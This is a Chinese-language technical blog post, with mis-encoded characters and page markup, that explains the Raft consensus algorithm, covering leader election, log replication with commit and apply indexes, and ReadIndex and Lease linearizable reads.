  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:41:07.000Z" title="Thu Nov 27 2025 06:41:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€œä¸å¯é çš„ç½‘ç»œâ€ã€â€œä¸ç¨³å®šçš„æ—¶é’Ÿâ€å’Œâ€œèŠ‚ç‚¹çš„æ•…éšœâ€éƒ½æ˜¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¸¸è§çš„é—®é¢˜ï¼Œåœ¨æ–‡ç« å¼€å§‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ï¼šå¦‚æœåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ç½‘ç»œä¸å¯é ä¼šå‘ç”Ÿä»€ä¹ˆæ ·çš„é—®é¢˜ã€‚</p>
<p>æœ‰ä»¥ä¸‹ 3 ä¸ªæœåŠ¡æ„æˆçš„åˆ†å¸ƒå¼é›†ç¾¤ï¼Œå¹¶åœ¨ server_1 ä¸­å‘ç”Ÿå†™è¯·æ±‚å˜æ›´ A = 1ï¼Œâ€œæ­£å¸¸æƒ…å†µä¸‹â€ server_1 å°† A å€¼åŒæ­¥ç»™ server_2 å’Œ server_3ï¼Œä¿è¯é›†ç¾¤çš„æ•°æ®ä¸€è‡´æ€§ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ef24adcba943aaaccd990a108b64ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=c1zBqbb5Qu8GoHfSX6CFbZDgjqI%3D" alt="raft.png" loading="lazy"/></p>
<p>ä½†æ˜¯å¦‚æœåœ¨æ•°æ®å˜æ›´æ—¶å‘ç”Ÿç½‘ç»œé—®é¢˜ï¼ˆå»¶è¿Ÿã€æ–­è¿å’Œä¸¢åŒ…ç­‰ï¼‰ä¾¿ä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼šæ¯”å¦‚æœ‰ä¸¤ä¸ªå†™æ“ä½œåŒæ—¶å‘ç”Ÿåœ¨ server_1 æˆ– server_3 ä¸Šï¼Œå³ä¾¿ä¸¤ä¸ªå†™æ“ä½œæœ‰å…ˆåé¡ºåºï¼Œä½†å¯èƒ½ç”±äºç½‘ç»œå»¶æ—¶å¯¼è‡´å„ä¸ªæœåŠ¡ä¸­æ•°æ®çš„ä¸ä¸€è‡´ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4927d1eff0d64b46893aebc585a4a263~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=FAOUIJGWGdF11eqV87Z5W11jVRw%3D" alt="raft2.png" loading="lazy"/></p>
<p>åŒæ ·åœ°æƒ…å†µï¼Œå¦‚æœåœ¨ server_1 ä¸Šå‘ç”Ÿä¸‰æ¬¡å†™æ“ä½œï¼Œåœ¨æ•°æ®åŒæ­¥çš„è¿‡ç¨‹ä¸­å› ä¸ºç½‘ç»œå»¶æ—¶æˆ–ç½‘ç»œä¸¢åŒ…ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc47590acd0c4e13bc23863c33ae3012~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=Vy3Y40uwIsCvr6PVDBwpHaAJwzY%3D" alt="raft3.png" loading="lazy"/></p>
<p>é‚£ä¹ˆä¸ºäº†é¿å…ä»¥ä¸Šè¿™äº›é›†ç¾¤é—´æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œä¾¿éœ€è¦åˆ†å¸ƒå¼å…±è¯†ç®—æ³•æ¥åè°ƒã€‚åˆ†å¸ƒå¼å…±è¯†ç®—æ³•ç®€å•æ¥è¯´å°±æ˜¯å¦‚ä½•åœ¨å¤šä¸ªæœåŠ¡å™¨é—´å¯¹æŸä¸€ä¸ªå€¼è¾¾æˆä¸€è‡´ï¼Œå¹¶ä¸”å½“è¾¾æˆä¸€è‡´ä¹‹åï¼Œæ— è®ºä¹‹åè¿™äº›æœºå™¨é—´å‘ç”Ÿæ€æ ·çš„æ•…éšœï¼Œè¿™ä¸ªå€¼èƒ½ä¿æŒä¸å˜ã€‚æœ¬ç¯‡æ–‡ç« æˆ‘ä»¬ä¾¿å¯¹ Raft ç®—æ³•è¿›è¡Œä»‹ç»ã€‚</p>
<h3 data-id="heading-0">ç†è§£ Raft ç®—æ³•</h3>
<p>äº†è§£å’Œå­¦ä¹ è¿‡ Zookeeper çš„åŒå­¦å¯èƒ½å¬è¯´è¿‡ Zab ç®—æ³•ï¼Œå®ƒç”¨æ¥ä¿è¯ Zookeeper ä¸­æ•°æ®çš„ <strong>é¡ºåºä¸€è‡´æ€§</strong>ã€‚Raft ä¹Ÿæ˜¯ä¸€ç§åˆ†å¸ƒå¼å…±è¯†ç®—æ³•ï¼Œå®ƒæ˜“äºç†è§£å’Œå®ç°ï¼Œç”¨äºä¿è¯æ•°æ®çš„ <strong>çº¿æ€§ä¸€è‡´æ€§</strong>ï¼Œæ˜¯æœ€å¼ºä¸€è‡´æ€§æ¨¡å‹ã€‚</p>
<p>åœ¨éµå¾ª Raft ç®—æ³•çš„é›†ç¾¤ä¸­ï¼ŒèŠ‚ç‚¹ä¼šæœ‰ 3 ç§ä¸åŒçš„è§’è‰²ã€‚å½“é›†ç¾¤åœ¨åˆå§‹åŒ–æ—¶ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„è§’è‰²éƒ½æ˜¯ Follower è·Ÿéšè€…ï¼Œå®ƒä»¬ä¼šç­‰å¾…æ¥è‡ª Leader èŠ‚ç‚¹çš„å¿ƒè·³ã€‚å› ä¸ºæ­¤æ—¶å¹¶æ²¡æœ‰ Leader èŠ‚ç‚¹ï¼Œæ‰€ä»¥ä¼šç­‰å¾…å¿ƒè·³è¶…æ—¶ã€‚ç­‰å¾…è¶…æ—¶çš„ Follower èŠ‚ç‚¹ä¼šå°†è§’è‰²è½¬å˜ä¸º Candidate å€™é€‰è€…ï¼Œè§¦å‘ä¸€æ¬¡é€‰ä¸¾ï¼Œè§¦å‘é€‰ä¸¾æ—¶ä¼šæ ‡è®° Term ä»»æœŸå˜é‡ï¼Œå¹¶å°†è‡ªå·±çš„ä¸€ç¥¨æŠ•ç»™è‡ªå·±ï¼Œé€šçŸ¥å…¶ä»– Follower èŠ‚ç‚¹å‘èµ·æŠ•ç¥¨ã€‚ç»è¿‡æŠ•ç¥¨åï¼Œæ”¶åˆ°è¶…è¿‡åŠæ•°èŠ‚ç‚¹ç¥¨æ•°çš„ Candidate èŠ‚ç‚¹ä¼šæˆä¸º Leader é¢†å¯¼è€…èŠ‚ç‚¹ï¼Œå…¶ä»–èŠ‚ç‚¹ä¸º Follower è·Ÿéšè€…èŠ‚ç‚¹ï¼ŒLeader èŠ‚ç‚¹ä¼šä¸æ–­åœ°å‘é€å¿ƒè·³ç»™ Follower èŠ‚ç‚¹æ¥ç»´æŒé¢†å¯¼åœ°ä½ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/274fc222277b481b8638036b23b3247e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=qBpByv5ZaL6%2BioiUDvxXQ6k6WJk%3D" alt="raft4.png" loading="lazy"/></p>
<p>å¦‚æœæ¯ä¸ªèŠ‚ç‚¹æ¯æ¬¡åœ¨è§¦å‘é€‰ä¸¾æ—¶éƒ½æ˜¯åŒæ—¶è¶…æ—¶ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯å¯¼è‡´ä¸èƒ½å®Œæˆä¸€æ¬¡é€‰ä¸¾ï¼Œäº§ç”Ÿ <strong>â€œæ´»é”â€</strong> é—®é¢˜ï¼Ÿçš„ç¡®å¯èƒ½ï¼Œä¸è¿‡æ´»é”é—®é¢˜ä¹Ÿå¾ˆå¥½è§£å†³ï¼šå³èŠ‚ç‚¹è¶…æ—¶æ—¶é—´åœ¨åˆç†çš„èŒƒå›´å†…å–éšæœºå€¼ï¼Œè¿™æ ·ç”±äºå®ƒçš„éšæœºæ€§å°±ä¸å¤ªå¯èƒ½å†åŒæ—¶å‘èµ·ç«é€‰äº†ï¼Œè¿™ä¸ªæ—¶å€™å…¶ä»–èŠ‚ç‚¹ä¾¿æœ‰è¶³å¤Ÿçš„æ—¶é—´å‘å…¶ä»–èŠ‚ç‚¹ç´¢è¦é€‰ç¥¨ã€‚</p>
<h4 data-id="heading-1">å†™å˜æ›´è¯·æ±‚</h4>
<p>å½“å‘ç”Ÿå†™å˜æ›´è¯·æ±‚æ—¶ï¼Œç”± Leader èŠ‚ç‚¹è´Ÿè´£å¤„ç†ï¼Œå³ä½¿æ˜¯è¯·æ±‚åˆ° Follower èŠ‚ç‚¹ï¼Œä¹Ÿéœ€è¦è½¬å‘ç»™ Leader èŠ‚ç‚¹å¤„ç†ã€‚å½“ Leader èŠ‚ç‚¹æ¥æ”¶åˆ°å†™è¯·æ±‚æ—¶ï¼Œå®ƒå¹¶ä¸ç«‹å³å¯¹è¿™ä¸ªè¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œæ˜¯å…ˆå°†è¯·æ±‚ä¿¡æ¯ <strong>æŒ‰é¡ºåºè¿½åŠ åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼ˆWAL: write-ahead-logï¼‰</strong> ï¼Œå¦‚å›¾ä¸­æ ‡è®°çš„ log_index è¡¨ç¤ºè¿½åŠ åˆ°çš„æœ€æ–°ä¸€æ¡æ—¥å¿—çš„åºå·ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e25aeb79af6a474c8cc608b589f54d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=2z0yHUkAG5qMrK%2FElbUdX0ODuDA%3D" alt="raft5.png" loading="lazy"/></p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ<strong>æ—¥å¿—å¿…é¡»æŒä¹…åŒ–å­˜å‚¨</strong>ã€‚éšåï¼ŒLeader èŠ‚ç‚¹é€šè¿‡ RPC è¯·æ±‚å°†æ—¥å¿—åŒæ­¥åˆ°å„ä¸ª Follower èŠ‚ç‚¹ï¼Œå½“è¶…è¿‡åŠæ•°èŠ‚ç‚¹æˆåŠŸå°†æ—¥å¿—è®°å½•æ—¶ï¼Œä¾¿è®¤ä¸ºåŒæ­¥æˆåŠŸã€‚åœ¨è¿™é‡Œå¯çŸ¥ Raft ç®—æ³•é‡‡ç”¨çš„æ˜¯å•ä¸»å¤åˆ¶çš„æ¨¡å‹ï¼Œæ‰€ä»¥å®ƒä¹Ÿå°±ä¼šå­˜åœ¨ä»¥ä¸‹ç¼ºç‚¹ï¼š</p>
<ol>
<li>é¢å¯¹å¤§é‡å†™è¯·æ±‚è´Ÿè½½æ—¶ç³»ç»Ÿæ¯”è¾ƒéš¾æ‰©å±•ï¼Œå› ä¸ºç³»ç»Ÿåªæœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼Œå†™è¯·æ±‚çš„æ€§èƒ½ç“¶é¢ˆç”±å•ä¸ªèŠ‚ç‚¹å†³å®š</li>
<li>å½“ä¸»èŠ‚ç‚¹å®•æœºæ—¶ï¼Œä»èŠ‚ç‚¹æå‡ä¸ºä¸»èŠ‚ç‚¹ä¸æ˜¯å³æ—¶çš„ï¼Œå¯èƒ½ä¼šé€ æˆä¸€äº›åœæœºæ—¶é—´</li>
</ol>
<p>éšåï¼ŒLeader èŠ‚ç‚¹ä¼šæ›´æ–°æœ€æ–°åŒæ­¥æ—¥å¿—çš„ç´¢å¼• commit_index ä¸º 1ï¼Œå¹¶é€šè¿‡å¿ƒè·³ä¸‹å‘ç»™å„ä¸ª Follower èŠ‚ç‚¹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d117c20fda3e4489b545e3e5e3d29564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=wHdsbKuMwEvEPqFnFFiiL2IHmbU%3D" alt="raft6.png" loading="lazy"/></p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å‘ç° Follower èŠ‚ç‚¹åªæ˜¯å¬ä»å¹¶å“åº” Leader èŠ‚ç‚¹ï¼Œæ²¡æœ‰ä»»ä½•ä¸»åŠ¨æ€§ã€‚ç°åœ¨ï¼Œå·²ç»å®Œæˆäº†æ—¥å¿—åœ¨é›†ç¾¤é—´çš„åŒæ­¥ï¼Œä½†æ˜¯è¯·æ±‚å¯¹å˜é‡ A çš„ä¿®æ”¹è¿˜æ²¡æœ‰è¢«åº”ç”¨ï¼ˆApplyï¼‰ã€‚Apply æ˜¯åœ¨ Raft ç®—æ³•ä¸­ç»å¸¸å‡ºç°çš„ä¸€ä¸ªåè¯ï¼Œåœ¨å¤šæ•°ä¸ Raft ç®—æ³•ç›¸å…³çš„æ–‡ç« ä¸­ç»å¸¸ä¼šçœ‹åˆ° â€œå°†å·²æäº¤çš„æ—¥å¿—æ¡ç›®åº”ç”¨åˆ°çŠ¶æ€æœºâ€ ç­‰ç±»ä¼¼çš„è¡¨è¿°ã€‚å…¶å® â€œçŠ¶æ€æœºâ€ ç†è§£èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œé€šä¿—çš„ç†è§£æ˜¯ <strong>ä¸šåŠ¡é€»è¾‘çš„è½½ä½“</strong> æˆ– <strong>ä¸šåŠ¡é€»è¾‘çš„æ‰§è¡Œè€…</strong>ï¼Œå®ƒçš„èŒè´£åŒ…æ‹¬ï¼š</p>
<ol>
<li>æ¥æ”¶æ¥è‡ªæ—¥å¿—æ–‡ä»¶ä¸­æœ‰åºçš„å‘½ä»¤</li>
<li>æ‰§è¡Œå…·ä½“çš„ä¸šåŠ¡é€»è¾‘ï¼Œåœ¨æœ¬æ¬¡å†™è¯·æ±‚ä¸­ï¼Œä¸šåŠ¡é€»è¾‘æŒ‡çš„ä¾¿æ˜¯å˜æ›´ A çš„å€¼</li>
<li>å˜æ›´åº”ç”¨ç¨‹åºçš„çŠ¶æ€</li>
<li>è¿”å›æ‰§è¡Œç»“æœ</li>
</ol>
<p>æ›´åŠ é€šä¿—çš„è®²å°±æ˜¯ <strong>è®©è¯·æ±‚ç”Ÿæ•ˆ</strong>ã€‚å°†å·²ç»æäº¤çš„æ—¥å¿—åº”ç”¨åˆ°çŠ¶æ€æœºæ˜¯æ¯”è¾ƒç®€å•ä¸”è‡ªä¸»çš„è¿‡ç¨‹ï¼Œå„ä¸ªæœåŠ¡å®ä¾‹ä¼šè®°å½• apply_index æ¥æ ‡è®°åº”ç”¨ç´¢å¼•ï¼Œå½“ apply_index å°äº commit_index æ—¶ï¼Œé‚£ä¹ˆè¯æ˜æ—¥å¿—æ–‡ä»¶ä¸­è®°å½•çš„è¯·æ±‚ä¿¡æ¯è¿˜æœ‰éƒ¨åˆ†æ²¡ç”Ÿæ•ˆï¼Œæ‰€ä»¥éœ€è¦æŒ‰é¡ºåºåº”ç”¨ï¼Œç›´åˆ° apply_index = commit_indexï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6c57c3e3ca0412f972fd8398b39ca75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=EitVlb7xVG7zMe73Pf%2Fbt90cgls%3D" alt="raft7.png" loading="lazy"/></p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸€ç›´åœ¨å¼ºè°ƒ <strong>â€œæŒ‰é¡ºåºâ€</strong> ï¼Œä¸è®ºæ˜¯æ—¥å¿—çš„è¿½åŠ è¿˜æ˜¯æ—¥å¿—çš„è¢«åº”ç”¨éƒ½æ˜¯æŒ‰é¡ºåºæ¥çš„ï¼Œå› æ­¤æ‰èƒ½ä¿è¯æ•°æ®çš„çº¿æ€§ä¸€è‡´æ€§ã€‚</p>
<h4 data-id="heading-2">è¯»è¯·æ±‚</h4>
<p>Raft é›†ç¾¤å¤„ç†è¯»è¯·æ±‚ä¼šä¿è¯è¯»è¯·æ±‚çš„çº¿æ€§ä¸€è‡´æ€§ï¼Œæ‰€è°“çº¿æ€§ä¸€è‡´æ€§è¯»å°±æ˜¯åœ¨ t1 çš„æ—¶é—´å†™å…¥äº†ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆåœ¨ t1 ä¹‹åï¼Œè¯»ä¸€å®šèƒ½è¯»åˆ°è¿™ä¸ªå€¼ï¼Œä¸å¯èƒ½è¯»åˆ° t1 ä¹‹å‰çš„å€¼ï¼Œåœ¨ Raft ç®—æ³•ä¸­å®ç°çº¿æ€§ä¸€è‡´æ€§è¯»æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š</p>
<h5 data-id="heading-3">ReadIndex Read</h5>
<p>åœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œå½“ Leader èŠ‚ç‚¹å¤„ç†è¯»è¯·æ±‚æ—¶ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d886b67e1664b74912b09ef50d9131b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830467&amp;x-signature=LXi6G8oL5kX8R0CrENTqgBIqPcE%3D" alt="raft10.png" loading="lazy"/></p>
<ol>
<li>é¦–å…ˆå°† commit_index è®°å½•åˆ°æœ¬åœ°çš„ read_index å˜é‡é‡Œ</li>
<li>å‘å…¶ä»–èŠ‚ç‚¹å‘é€ä¸€æ¬¡ Heartbeatï¼Œç¡®è®¤è‡ªå·±ä»ç„¶æ˜¯ Leader è§’è‰²</li>
<li>Leader èŠ‚ç‚¹ç­‰å¾…è‡ªå·±çš„çŠ¶æ€æœºæ‰§è¡Œï¼Œç›´åˆ° apply_index è¶…è¿‡äº† read_indexï¼Œè¿™æ ·å°±èƒ½å¤Ÿå®‰å…¨çš„æä¾›çº¿æ€§ä¸€è‡´æ€§è¯»äº†</li>
<li>Leader æ‰§è¡Œ read è¯·æ±‚ï¼Œå°†ç»“æœè¿”å›</li>
</ol>
<p>åœ¨ç¬¬ä¸‰æ­¥ä¸­ï¼Œä¿è¯ <code>apply_index &gt;= read_index</code> æ˜¯ä¸ºäº†ä¿è¯æ‰€æœ‰å°äºç­‰äº <code>read_index</code> çš„è¯·æ±‚éƒ½å·²ç»ç”Ÿæ•ˆã€‚</p>
<p>å¦‚æœæ˜¯ Follower èŠ‚ç‚¹å¤„ç†è¯»è¯·æ±‚ä¹Ÿå’Œä»¥ä¸Šè¿‡ç¨‹ç±»ä¼¼ï¼Œå½“ Follower èŠ‚ç‚¹æ”¶åˆ°è¯»è¯·æ±‚åï¼Œç›´æ¥ç»™ Leader å‘é€ä¸€ä¸ªè·å–æ­¤æ—¶ read_index çš„è¯·æ±‚ï¼ŒLeader èŠ‚ç‚¹ä»ç„¶å¤„ç†ä»¥ä¸Šæµç¨‹ç„¶åå°† read_index è¿”å›ï¼Œæ­¤æ—¶ Follower èŠ‚ç‚¹ç­‰åˆ°å½“å‰çš„çŠ¶æ€æœº apply_index è¶…è¿‡ read_index åï¼Œå°±å¯ä»¥è¿”å›ç»“æœäº†ã€‚</p>
<h5 data-id="heading-4">Lease Read</h5>
<p>å› ä¸º ReadIndex Read éœ€è¦å‘é€ä¸€æ¬¡ Heartbeat æ¥ç¡®è®¤ Leader èº«ä»½ï¼Œå­˜åœ¨ RPC è¯·æ±‚çš„å¼€é”€ï¼Œä¸ºäº†è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œä¾¿å¯ä»¥é‡‡ç”¨ç§Ÿçº¦ï¼ˆLeaseï¼‰è¯»ã€‚ç§Ÿçº¦å…¶å®æŒ‡çš„æ˜¯ Leader èŠ‚ç‚¹èº«ä»½çš„è¿‡æœŸçº¦å®šæ—¶é—´ï¼Œæ‰€ä»¥è¿™ç§è¯»è¯·æ±‚åªé’ˆå¯¹ Leader èŠ‚ç‚¹ï¼ŒFollower èŠ‚ç‚¹æ²¡æœ‰ç§Ÿçº¦çš„æ¦‚å¿µï¼Œå®ƒé€šè¿‡ä»¥ä¸‹å…¬å¼è®¡ç®—ï¼š</p>
<p><code>lease_end = current_time() + election_timeout / clock_drift_bound</code></p>
<p>å…¶ä¸­ election_timeout ä¸ºé€‰ä¸¾çš„è¶…æ—¶æ—¶é—´ï¼Œclock_drift_bound è¡¨ç¤ºæ—¶é’Ÿæ¼‚ç§»ï¼ŒæŒ‡çš„æ˜¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¸¤ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹ä¸Šçš„æ—¶é’Ÿä»¥ä¸åŒçš„é€Ÿç‡è¿è¡Œï¼Œå¯¼è‡´å®ƒä»¬ä¹‹é—´çš„æ—¶é—´å·®éšæ—¶é—´ä¸æ–­ç´¯ç§¯å’Œå˜åŒ–ï¼ˆä¹Ÿå°±æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸ç¨³å®šçš„æ—¶é’Ÿé—®é¢˜ï¼‰ã€‚</p>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå‡å¦‚é€‰ä¸¾è¿‡æœŸæ—¶é—´æ˜¯ 10sï¼Œæ—¶é’Ÿæ¼‚ç§»ä¸º 1.1ï¼Œé‚£ä¹ˆç§Ÿçº¦è¿‡æœŸæ—¶é—´ä¸ºï¼šlease_end = current_time() + 10s / 1.1 â‰ˆ current_time() + 9sï¼Œå¦‚æœåœ¨å¤„ç†è¯»è¯·æ±‚æ—¶ï¼Œåœ¨ç§Ÿçº¦æ—¶é—´å†…ï¼Œåˆ™æ— éœ€å‘é€ Heartbeat æ¥æ˜ç¡® Leader èº«ä»½ï¼Œç›´æ¥ç­‰å¾… apply_index &gt;= commit_index åè¿”å›è¯·æ±‚ç»“æœã€‚</p>
<hr/>
